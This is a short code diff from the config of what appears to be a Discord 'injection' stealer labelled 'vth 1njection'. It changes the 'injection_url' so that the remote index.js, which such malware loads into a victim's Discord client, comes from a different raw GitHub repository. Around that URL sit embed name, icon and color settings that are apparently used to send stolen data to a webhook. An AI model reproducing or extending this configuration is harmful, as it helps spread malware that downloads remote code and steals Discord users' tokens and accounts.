@@ -14,7 +14,7 @@ const config = {
   embed_name: 'vth 1njection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1193444494801129502/1193877207978872832/pfp.jpg?'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/1nuhongio/1nuhongio/main/index.js', 
   /**
    
    **/
